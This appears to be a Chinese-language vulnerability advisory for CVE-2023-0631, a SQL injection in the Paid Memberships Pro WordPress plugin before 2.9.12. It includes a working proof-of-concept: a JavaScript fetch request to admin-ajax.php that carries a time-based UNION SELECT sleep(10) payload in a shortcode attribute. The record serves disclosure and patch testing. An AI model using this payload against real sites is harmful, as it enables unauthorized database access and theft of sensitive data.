# CVE-2023-0631
## 来源

[https://wpscan.com/vulnerability/19ef92fd-b493-4488-91f0-e6ba51362f79](https://wpscan.com/vulnerability/19ef92fd-b493-4488-91f0-e6ba51362f79)

## 漏洞简介

WordPress和WordPress plugin都是WordPress基金会的产品。WordPress是一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。

Paid Memberships Pro是一款WordPress的插件。Paid Memberships Pro在2.9.12版本之前存在SQL注入漏洞，该插件没有对用户输入进行过滤或者转义，导致具有订阅权限的攻击者可以获取数据库中的敏感信息。

## 影响范围

-   Paid Memberships Pro < 2.9.12

## 漏洞类型

SQL注入

## POC

```javascript
While logged in as a subscriber, send the following request:

(await fetch('/wp-admin/admin-ajax.php',{method:'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'},body:'action=parse-media-shortcode&shortcode=[membership delay="Y" levels="(-1)) UNION SELECT sleep(10)-- ,L"]'})).text()

If successful, the request should hang for ~10 seconds, indicating we successfully injected something in the affected SQL query. 
```

